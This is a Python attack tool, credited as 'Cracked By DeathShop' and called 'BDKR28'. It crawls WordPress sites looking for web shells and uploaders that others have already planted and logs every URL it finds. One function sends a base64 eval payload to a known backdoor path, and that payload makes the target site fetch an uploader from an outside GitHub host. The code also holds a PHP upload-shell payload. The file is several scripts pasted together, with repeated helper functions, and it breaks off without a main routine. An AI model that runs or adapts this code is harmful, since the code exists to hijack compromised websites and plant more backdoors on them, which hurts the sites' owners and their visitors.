import os
import requests
import threading
from multiprocessing.dummy import Pool,Lock
from bs4 import BeautifulSoup
import time
import smtplib,sys,ctypes
from random import choice
from colorama import Fore
from colorama import Style
from colorama import init
import re
import time
import platform
from time import sleep
import telepot
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
Bad = 0
Good = 0
pro = 0
mailer = 0
password = 0

banner = '''{}


  ____  _____  _  _______  ___   ___  
 |  _ \|  __ \| |/ /  __ \|__ \ / _ \ 
 | |_) | |  | | ' /| |__) |  ) | (_) |
 |  _ <| |  | |  < |  _  /  / / > _ < 
 | |_) | |__| | . \| | \ \ / /_| (_) |
 |____/|_____/|_|\_\_|  \_\____|\___/ 


Cracked By DeathShop
TooL Priv BDKR28  v2

\n'''.format(fr)
print banner

def SendMsg(msg):
    return

def clear():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass

def finder(i):
    global Bad, Good, pro, password, mailer
    head = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    try:
        x = requests.session()
        listaa = ['ok.php','wso112233.php','ccx/index.php', 'wp-content/themes/ccx/index.php','radio.php',]
        for script in listaa:
            url = (i + "/" + script)
            while True:
                req_first = x.get(url, headers=head)
                if "drwxr-xr-x" in req_first.text:
                    Good = Good + 1
                    print(fw + "-|" + " Vuln > " + fg + url)
                    # bot.sendMessage(user, url+"\n")
                    with open("shell.txt", "a") as file:
                        file.write(url + "\n")
                        file.close()
                    SendMsg(url)
                else:
                    Bad = Bad + 1
                    print(fr + "-|" + " Not Vuln > " + fg + i)

                    pass
                break
    except:
        pass

from tabnanny import check
import requests
import os
import sys
from re import findall as reg
from multiprocessing.dummy import Pool
import string
from random import choice, randint
from colorama import Fore
from colorama import Style
from colorama import init
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

requests.urllib3.disable_warnings()

headers = {'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'
}
url ='https://raw.githubusercontent.com/bokxud/Private/main/indexofpaths.txt'
fews = requests.get(url).text
ofindex = reg('(.*?)\n',fews)
def checke(i) :
    global ofindex
    try :
        for k in  ofindex :
            url  = i+'/'+k
            checking = requests.get(url, timeout=10).text
            if '<title>Index of' in checking :
                got(url)
            else :
                print('Faild =====>>> '+i)
    except :
        pass
def got(url) :
    try :
        check =requests.get(url, timeout=10).text
        checking = reg('href="(.*?)">', check)[5:]
        for x in checking :
            if '/' not in  x and '.php' in x :
                new_url = url+x
                checking_new = requests.get(new_url, timeout=10)
                if ">public_html" in checking_new.text or "<span>Upload file:" in checking_new.text or 'type="submit" id="_upl" value="Upload">' in checking_new.text or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in checking_new.text or '>File Upload :<' in checking_new.text or 'Leaf PHPMailer</title>' in checking_new.text :
                    print('Found shell here :   '+new_url)
                    open('rsf_BDKR.txt','a').write(new_url+'\n')
                    SendMsg(new_url)
                elif 'method=post>Password<br><input type=password' in checking_new.text :
                    print('SHELLPASWORD ====>>> '+new_url)
                    open('passw.txt','a').write(new_url+'\n')
                    SendMsg(new_url)
                else :
                    print(new_url)
            elif '/' in x :
                link = url+x
                second = requests.get(link, timeout=10)
                if '<title>Index of' in second.text :
                    utch = reg('href="(.*?)">', second.text)
                    for z in utch :
                        if '/' not in z and '.php' in z:
                            folder_two = link + z
                            folder_check = requests.get(folder_two,timeout=10)
                            if ">public_html" in folder_check.text or "<span>Upload file:" in folder_check.text or 'type="submit" id="_upl" value="Upload">' in folder_check.text or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in folder_check.text or '>File Upload :<' in folder_check.text or 'Leaf PHPMailer</title>' in folder_check.text :
                                print('found shell here =====>> '+folder_two)
                                open('rsf_BDKR.txt','a').write(folder_two+'\n')
                                SendMsg(folder_two)
                            elif 'method=post>Password<br><input type=password' in folder_check.text :
                                print('Password '+folder_two)
                                open('shell_pssw.txt','a').write(folder_two+'\n')
                                SendMsg(folder_two)
                            else:
                                print(folder_two)
                        elif '/' in z :
                            make = link+z
                            las = requests.get(make, timeout=10).text
                            if '<title>Index of' in las :
                                jbad = reg('href="(.*?)">', las)
                                for a in jbad :
                                    if '/' not in a and '.php' in a :
                                        lien = make + a
                                        send = requests.get(lien, timeout=10).text
                                        if ">public_html" in send or "<span>Upload file:" in send or 'type="submit" id="_upl" value="Upload">' in send or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in send or '>File Upload :<' in send or 'Leaf PHPMailer</title>' in send :
                                            print('shell is here ====>> '+lien)
                                            open('rsf_BDKR.txt','a').write(lien+'\n')
                                            SendMsg(lien)
                                        elif 'method=post>Password<br><input type=password' in send :
                                            print('password ======>> '+lien)
                                            open('shell_pssw.txt','a').write(lien+'\n')
                                            SendMsg(lien)
                                        else:
                                            print(lien)
                                    elif '/' in a :
                                        BDKR_hacker = make + a
                                        sender_ut = requests.get(BDKR_hacker, timeout=10).text
                                        if '<title>Index of' in sender_ut :
                                            listat = reg('href="(.*?)">', sender_ut)
                                            for w in listat :
                                                if '/' not in w and '.php' in w :
                                                    rabitt = BDKR_hacker + w
                                                    checkingg = requests.get(rabitt, timeout=10).text
                                                    if ">public_html" in checkingg or "<span>Upload file:" in checkingg or 'type="submit" id="_upl" value="Upload">' in checkingg or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in checkingg or '>File Upload :<' in checkingg or 'Leaf PHPMailer</title>' in checkingg :
                                                        print('Shell here ====> '+rabitt)
                                                        open('rsf_BDKR.txt','a').write(rabitt+'\n')
                                                        SendMsg(rabitt)
                                                    elif 'method=post>Password<br><input type=password' in checkingg :
                                                        print('Password here =====>  '+rabitt)
                                                        open('shell_passw.txt','a').write(rabitt+'\n')
                                                        SendMsg(rabitt)
                                                    else:
                                                        print(rabitt)
                                                elif '/' in w :
                                                    serv = BDKR_hacker + w #hada rah folder for9 folder
                                                    f_serv = requests.get(serv, timeout=10).text
                                                    if '<title>Index of' in f_serv :
                                                        noce = reg('href="(.*?)">', f_serv)
                                                        for q in noce :
                                                            if '/' not in q and '.php' in q :
                                                                mw = serv + q
                                                                check_q =requests.get(mw, timeout=10).text
                                                                if ">public_html" in check_q or "<span>Upload file:" in check_q or 'type="submit" id="_upl" value="Upload">' in check_q or 'button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load"' in check_q or '>File Upload :<' in check_q or 'Leaf PHPMailer</title>' in check_q :
                                                                    print('shell =====>  '+mw)
                                                                    open('rsf_BDKR.txt','a').write(mw+'\n')
                                                                    SendMsg(mw)
                                                                elif 'method=post>Password<br><input type=password' in check_q :
                                                                    print('Password =======>'+mw)
                                                                    open('shell_passw.txt','a').write(mw+'\n')
                                                                    SendMsg(mw)
                                                                else :
                                                                    print(mw)
            else:
                print('None')
    except:
        pass

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site:
        site = 'http://' + site
    if site[-1] is not '/':
        site = site + '/'
    return site


def domain(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    if 'www.' in site:
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/'):
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern, site)
        site = sitez[0]
    return site


def addWWW(site):
    if site.startswith("http://"):
        site = site.replace("http://", "http://www.")
    elif site.startswith("https://"):
        site = site.replace("https://", "https://www.")
    else:
        site = 'http://www.' + site
    return site


def exploit(url):
    try:
        dom = domain(url)
        url = URLdomain(url)
        if 'www.' in url:
            username = url.replace('www.', '')
        else:
            username = url
        if '.' in username:
            username = username.split('.')[0]
        if 'http://' in username:
            username = username.replace('http://', '')
        else:
            username = username.replace('https://', '')
        up = username.title()
        filename = id_generator()
        file_name = "uploader.php"
        shell_content = """$x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/css/colors/blue/""" + file_name + """','w+'),file_get_contents('https://raw.githubusercontent.com/tanjim530/Private_exploit/main/uploader.txt'));echo "bdkr28".$x;"""
        data = {'vz': shell_content}
        check = requests.post(
            url + "/wp-admin/css/colors/blue/blue.php?wall=ZWNobyBhRHJpdjQ7ZXZhbCgkX1BPU1RbJ3Z6J10pOw==", data=data,
            headers=headers, verify=False, timeout=15).content
        print check
        if 'bdkr28' in check:
            print("-| {}   Success  (Found)").format(url)
            open("Uploader.txt", "a").write(url + "wp-admin/css/colors/blue/" + file_name + "\n")
            SendMsg(url + "wp-admin/css/colors/blue/" + file_name)

        else:
            print("-| {}   Falid (Not ) ").format(url)
            open('badShell.txt', 'a').write(url + "\n")
    except:
        print ' -| ' + url + '--> {}[exploit-3]'.format(fr)

shell = """<?php echo "BDKR28"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def FourHundredThree(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/background-image-cropper/ups.php',headers=headers, allow_redirects=True,timeout=15)
        if 'enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/background-image-cropper/ups.php\n')
                SendMsg(url + '/wp-content/plugins/background-image-cropper/ups.php')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/background-image-cropper/ups.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/background-image-cropper/ups.php\n')
                    SendMsg(url + '/wp-content/plugins/background-image-cropper/ups.php')
            else:
                print ' -| ' + url + ' --> {}[exploit-4]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[exploit-4]'.format(fr)


shell = """<?php echo "BDKR28"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}


def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def FourHundredThreee(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/w0rdpr3ssnew/wp-login.php',headers=headers, allow_redirects=True,timeout=15)
        if 'Public Shell Version 2.0' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-content/plugins/w0rdpr3ssnew/wp-login.php\n')
                SendMsg(url + '/wp-content/plugins/w0rdpr3ssnew/wp-login.php')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/w0rdpr3ssnew/about.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Faizzz-Chin ShellXploit' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('Shells.txt', 'a').write(url + '/wp-content/plugins/w0rdpr3ssnew/about.php\n')
                    SendMsg(url + '/wp-content/plugins/w0rdpr3ssnew/about.php')
            else:
                print ' -| ' + url + ' --> {}[exploit-5]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[exploit-5]'.format(fr)


headers = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0',
   'Upgrade-Insecure-Requests': '1',
   'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
   'Accept-Encoding': 'gzip, deflate',
   'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
   'referer': 'www.google.com'}

def ran(length):
    letters = string.ascii_lowercase
    return ('').join(random.choice(letters) for i in range(length))


def URLdomain(site):
    if 'http://' not in site and 'https://' not in site:
        site = 'http://' + site
    if site[(-1)] is not '/':
        site = site + '/'
    return site


def domain(site):
    if site.startswith('http://'):
        site = site.replace('http://', '')
    else:
        if site.startswith('https://'):
            site = site.replace('https://', '')
        if 'www.' in site:
            site = site.replace('www.', '')
        site = site.rstrip()
        if site.split('/'):
            site = site.split('/')[0]
        while site[(-1)] == '':
            pattern = re.compile('(.*)/')
            sitez = re.findall(pattern, site)
            site = sitez[0]

    return site


def addWWW(site):
    if site.startswith('http://'):
        site = site.replace('http://', 'http://www.')
    elif site.startswith('https://'):
        site = site.replace('https://', 'https://www.')
    else:
        site = 'http://www.' + site
    return site


def exploit(url):
    try:
        dom = domain(url)
        url = URLdomain(url)
        if 'www.' in url:
            username = url.replace('www.', '')
        else:
            username = url
        if '.' in username:
            username = username.split('.')[0]
        if 'http://' in username:
            username = username.replace('http://', '')
        else:
            username = username.replace('https://', '')
        up = username.title()
        listdir = ['wp-admin/includes/', 'wp/wp-admin/includes/', 'wordpress/wp-admin/includes/', 'site/wp-admin/includes/', 'blog/wp-admin/includes/']
        for directory in listdir:
            inj = url + directory
            check = requests.get(inj, headers=headers, verify=False, timeout=15).content
            if 'class-wp-pa' in check:
                if re.findall(re.compile('(.*)class-wp-page(.*)\\.php"'), check):
                    fileX = 'class-wp-pa' + re.findall(re.compile('(.*)class-wp-pa(.*)\\.php"'), check)[0][1] + '.php'
                    src2 = requests.get(url + directory + fileX, headers=headers, timeout=15).content
                    if 'type="file"' in src2:
                        open('Shells.txt', 'a').write(url + directory + fileX + ' \n')
                        SendMsg(url + directory + fileX)
                        print ' -| ' + url + ('--> {}[0day]').format(fg)
                        break
                    else:
                        print ' -| ' + url + ('--> {}[exploit-6]').format(fr)
                else:
                    print ' -| ' + url + ('--> {}[exploit-6]').format(fr)
            else:
                print ' -| ' + url + ('--> {}[exploit-6]').format(fr)

    except:
        print ' -| ' + url + ('--> {}[exploit-6]').format(fr)


headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
fb  =   Fore.BLUE

Locations = ["/.well-known/','/.well-known/pki-validation/','/.well-known/acme-challenge/','/vendor/phpunit/phpunit/src/Util/PHP/','/wp-content/uploads/','/wp-admin/','/wordpress/wp-admin/includes','/wp-admin/js/','/ALFA_DATA/','/wp-content/upgrade/','/wp-admin/css/colors/','/wp-includes/','/wp-includes/css/','/wp-includes/ID3','/wp-includes/IXR/','/wp-includes/Requests/','/wp-includes/SimplePie/','/wp-includes/Text/','/wp-includes/Text/Diff/Renderer/','/wp-includes/blocks/','/wp-includes/certificates/','/wp-includes/customize/','/wp-includes/fonts/','/wp-includes/images/','/wp-includes/js/','/wp-includes/pomo/','/wp-includes/rest-api/','/wp-includes/widgets/','/wp-admin/css/','/wp-admin/images/','/wp-admin/maint/','/wp-admin/meta/','/wp-admin/network/','/wp-admin/user/','/wp-content/','/wp-content/uploads/ao_ccss/','/wp-content/uploads/2021/','/wp-content/plugins/elementor/','/wp-content/plugins/','/wp-content/mu-plugins/','/wp-content/themes/','/upload/image/','/uploads/','/wordpress/wp-content/uploads/','/wordpress/wp-includes/','/blog/wp-includes/','/wp-admin/includes/','/WordPress/wp-admin/includes/','/sites/default/files/','/admin/controller/extension/extension/"]
TrustedFiles = ['admin-filters','admin','ajax-actions','PHPMailer','SMTP','translations','mo','bookmark','getid3.lib','getid3','module.audio-video.asf','module.audio-video.flv','module.audio-video.matroska','module.audio-video.quicktime','module.audio-video.riff','module.audio.ac3','module.audio.dts','module.audio.flac','module.audio.mp3','module.audio.ogg','module.tag.apetag','module.tag.id3v1','module.tag.id3v2','module.tag.lyrics3','script-loader-packages','class-IXR-base64','class-IXR-client','class-IXR-clientmulticall','class-IXR-date','class-IXR-error','class-IXR-introspectionserver','class-IXR-message','class-IXR-request','class-IXR-server','class-IXR-value','heading-paragraph','large-header-button','large-header','quote','text-three-columns-buttons','text-two-columns-with-images','text-two-columns','three-buttons','two-buttons','two-images','align','colors','custom-classname','generated-classname','typography','archives','block','calendar','categories','index','latest-comments','latest-posts','rss','search','shortcode','social-link','tag-cloud','entry','mo','plural-forms','po','streams','translations','Dentry','mo','plural-forms','po','streams','translations','byte_safe_strings','cast_to_int','error_polyfill','random','random_bytes_com_dotnet','random_bytes_dev_urandom','random_bytes_libsodium','random_bytes_libsodium_legacy','random_bytes_mcrypt','random_int','Auth','Cookie','Exception','Hooker','Hooks','IDNAEncoder','IPv6','IRI','Proxy','Response','Session','SSL','Transport','class-wp-rest-request','class-wp-rest-response','class-wp-rest-server','Author','Cache','Caption','Category','Copyright','Core','Credit','Enclosure','Exception','File','gzdecode','IRI','Item','Locator','Misc','Parser','Rating','Registry','Restriction','Sanitize','Source','class-wp-sitemaps-index','class-wp-sitemaps-provider','class-wp-sitemaps-registry','class-wp-sitemaps-renderer','class-wp-sitemaps-stylesheet','class-wp-sitemaps','class-wp-sitemaps-posts','class-wp-sitemaps-taxonomies','class-wp-sitemaps-users','autoload','autoload','inline','Diff','Renderer','native','string','xdiff','comments','embed-404','embed-content','embed','footer-embed','footer','header-embed','header','sidebar','class-wp-nav-menu-widget','class-wp-widget-archives','class-wp-widget-calendar','class-wp-widget-categories','class-wp-widget-custom-html','class-wp-widget-links','class-wp-widget-media-audio','class-wp-widget-media-gallery','class-wp-widget-media-image','class-wp-widget-media-video','class-wp-widget-media','class-wp-widget-meta','class-wp-widget-pages','class-wp-widget-recent-comments','class-wp-widget-recent-posts','class-wp-widget-rss','class-wp-widget-search','class-wp-widget-tag-cloud','class-wp-widget-text','class-automatic-upgrader-skin','class-bulk-plugin-upgrader-skin','class-bulk-theme-upgrader-skin','class-bulk-upgrader-skin','class-core-upgrader','class-custom-background','class-custom-image-header','class-file-upload-upgrader','class-ftp-pure','class-ftp-sockets','class-ftp','class-language-pack-upgrader-skin','class-language-pack-upgrader','class-pclzip','class-plugin-installer-skin','class-plugin-upgrader-skin','class-plugin-upgrader','class-theme-installer-skin','class-theme-upgrader-skin','class-theme-upgrader','class-walker-category-checklist','class-walker-nav-menu-checklist','class-walker-nav-menu-edit','class-wp-ajax-upgrader-skin','class-wp-application-passwords-list-table','class-wp-automatic-updater','class-wp-comments-list-table','class-wp-community-events','class-wp-debug-data','class-wp-filesystem-base','class-wp-filesystem-direct','class-wp-filesystem-ftpext','class-wp-filesystem-ftpsockets','class-wp-filesystem-ssh2','class-wp-importer','class-wp-internal-pointers','class-wp-links-list-table','class-wp-list-table-compat','class-wp-list-table','class-wp-media-list-table','class-wp-ms-sites-list-table','class-wp-ms-themes-list-table','class-wp-ms-users-list-table','class-wp-plugin-install-list-table','class-wp-plugins-list-table','class-wp-post-comments-list-table','class-wp-posts-list-table','class-wp-privacy-data-export-requests-list-table','class-wp-privacy-data-removal-requests-list-table','class-wp-privacy-policy-content','class-wp-privacy-requests-table','class-wp-screen','class-wp-site-health-auto-updates','class-wp-site-health','class-wp-site-icon','class-wp-terms-list-table','class-wp-theme-install-list-table','class-wp-themes-list-table','class-wp-upgrader-skin','class-wp-upgrader-skins','class-wp-upgrader','class-wp-users-list-table','comment','continents-cities','credits','dashboard','deprecated','edit-tag-messages','export','file','image-edit','image','import','list-table','media','menu','meta-boxes','misc','ms-admin-filters','ms-deprecated','ms','nav-menu','network','noop','options','plugin-install','plugin','post','privacy-tools','revision','schema','screen','taxonomy','template','theme-install','theme','translation-install','update-core','update','upgrade','user','widgets','admin-bar', 'atomlib', 'class-wp-application-passwords','repair','class-wp-block-supports','class-wp-terms', 'class-wp-block-supports', 'author-template', 'block-patterns', 'blocks', 'bookmark-template', 'bookmark', 'cache-compat', 'cache', 'canonical', 'capabilities', 'category-template', 'category', 'class-IXR', 'class-feed', 'class-http', 'class-json', 'class-oembed', 'class-phpass', 'class-phpmailer', 'class-pop3', 'class-requests', 'class-simplepie', 'class-smtp', 'class-snoopy', 'class-walker-category-dropdown', 'class-walker-category', 'class-walker-comment', 'class-walker-nav-menu', 'class-walker-page-dropdown', 'class-walker-page', 'class-wp-admin-bar', 'class-wp-ajax-response', 'class-wp-block-list', 'class-wp-block-parser', 'class-wp-block-pattern-categories-registry', 'class-wp-block-patterns-registry', 'class-wp-block-styles-registry', 'class-wp-block-type-registry', 'class-wp-block-type', 'class-wp-block', 'class-wp-comment-query', 'class-wp-comment', 'class-wp-customize-control', 'class-wp-customize-manager', 'class-wp-customize-nav-menus', 'class-wp-customize-panel', 'class-wp-customize-section', 'class-wp-customize-setting', 'class-wp-customize-widgets', 'class-wp-date-query', 'class-wp-dependency', 'class-wp-editor', 'class-wp-embed', 'class-wp-error', 'class-wp-fatal-error-handler', 'class-wp-feed-cache-transient', 'class-wp-feed-cache', 'class-wp-hook', 'class-wp-http-cookie', 'class-wp-http-curl', 'class-wp-http-encoding', 'class-wp-http-ixr-client', 'class-wp-http-proxy', 'class-wp-http-requests-hooks', 'class-wp-http-requests-response', 'class-wp-http-response', 'class-wp-http-streams', 'class-wp-image-editor-gd', 'class-wp-image-editor-imagick', 'class-wp-image-editor', 'class-wp-list-util', 'class-wp-locale-switcher', 'class-wp-locale','wp-tmp' ,'wp-feed','wp-vcd', 'class-wp-matchesmapregex', 'class-wp-meta-query', 'class-wp-metadata-lazyloader', 'class-wp-network-query', 'class-wp-network', 'class-wp-object-cache', 'class-wp-oembed-controller', 'class-wp-oembed', 'class-wp-paused-extensions-storage', 'class-wp-post-type', 'class-wp-post', 'class-wp-query', 'class-wp-recovery-mode-cookie-service', 'class-wp-recovery-mode-email-service', 'class-wp-recovery-mode-key-service', 'class-wp-recovery-mode-link-service', 'class-wp-recovery-mode', 'class-wp-rewrite', 'class-wp-role', 'class-wp-roles', 'class-wp-session-tokens', 'class-wp-simplepie-file', 'class-wp-simplepie-sanitize-kses', 'class-wp-site-query', 'class-wp-site', 'class-wp-tax-query', 'class-wp-taxonomy', 'class-wp-term-query', 'class-wp-term', 'class-wp-text-diff-renderer-inline', 'class-wp-text-diff-renderer-table', 'class-wp-theme', 'class-wp-user-meta-session-tokens', 'class-wp-user-query', 'class-wp-user-request', 'class-wp-user', 'class-wp-walker', 'class-wp-widget-factory', 'class-wp-widget', 'class-wp-xmlrpc-server', 'class-wp', 'class.wp-dependencies', 'class.wp-scripts', 'class.wp-styles', 'comment-template', 'comment', 'compat', 'cron', 'date', 'default-constants', 'default-filters', 'default-widgets', 'deprecated', 'embed-template', 'embed', 'error-protection', 'feed-atom-comments', 'feed-atom', 'feed-rdf', 'feed-rss', 'feed-rss2-comments', 'feed-rss2', 'feed', 'formatting', 'functions', 'functions.wp-scripts', 'functions.wp-styles', 'general-template', 'http', 'kses', 'l10n', 'link-template', 'load', 'locale', 'media-template', 'media', 'meta', 'ms-blogs', 'ms-default-constants', 'ms-default-filters', 'ms-deprecated', 'ms-files', 'ms-functions', 'ms-load', 'ms-network', 'ms-settings', 'ms-site', 'nav-menu-template', 'nav-menu', 'option', 'pluggable-deprecated', 'pluggable', 'plugin', 'post-formats', 'post-template', 'post-thumbnail-template', 'post', 'query', 'registration-functions', 'registration', 'rest-api', 'revision', 'rewrite', 'rss-functions', 'rss', 'script-loader', 'session', 'shortcodes', 'sitemaps', 'spl-autoload-compat', 'taxonomy', 'template-loader', 'template', 'theme', 'update', 'user', 'vars', 'version', 'widgets', 'wp-db', 'wp-diff', 'https-detection', 'https-migration', 'robots-template']

shell = """<?php echo "BDKR28"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def Checker(url):
    try:
        checkShell = requests.get(url,headers=headers , timeout=15 , allow_redirects=True).content
        if 'FilesMan' in checkShell:
            print ' -| ' + url + ' --> {}[Succefully WSO]'.format(fg)
            open('wso.txt', 'a').write(url  +'\n')
            SendMsg(url)
        elif ('upload' in checkShell or 'up' in checkShell or 'Upload' in checkShell or 'FilesMAn' in checkShell or 'idx_file' in checkShell or 'userfile' in checkShell or ('Uname:' in checkShell and 'zb' in checkShell) or ('MisterSpyv7up' in checkShell and 'uploads' in checkShell) or 'File Manager' in checkShell ) and '301 Moved Permanently' not in checkShell and 'w3.org' not in checkShell and 'viewport' not in checkShell and 'input' in checkShell and 'svg' not in checkShell:
            print ' -| ' + url + ' --> {}[Succefully Uploader]'.format(fg)
            open('uploader.txt', 'a').write(url  +'\n')
            SendMsg(url)
        elif ('<pre align=center><form method=post>Password<br><input type=password name=pass' in checkShell and 'style=\'background-color:whitesmoke;border:1px solid #FFF;outline:none' in checkShell and 'type=submit name=\'watching\' value=\'submit\'' in checkShell) :
            print ' -| ' + url + ' --> {}[Succefully Xleet]'.format(fg)
            open('xleet.txt', 'a').write(url  +'\n')
            SendMsg(url)
        else:
            print ' -| ' + url + ' --> {}[exploit-7]'.format(fr)
    except:
        print ' -| ' + url + ' --> {}[exploit-7]'.format(fr)
def ExtractFiles(url,PageSource):
    try:
        regex = 'php">(.*).php</a>'
        files = re.findall(regex, PageSource)
        for element in TrustedFiles:
            if element in files:
                files.remove(element)
        if len(files) == 0:
            print ' -| ' + url + ' --> {}[No Unknown Files]'.format('\033[33m')
        if len(files) < 15:
            for file in files:
                Checker(url+'/'+file.replace(' ','')+'.php')
        else:
            print ' -| ' + url + ' --> {}[many unknown files]'.format(fr)
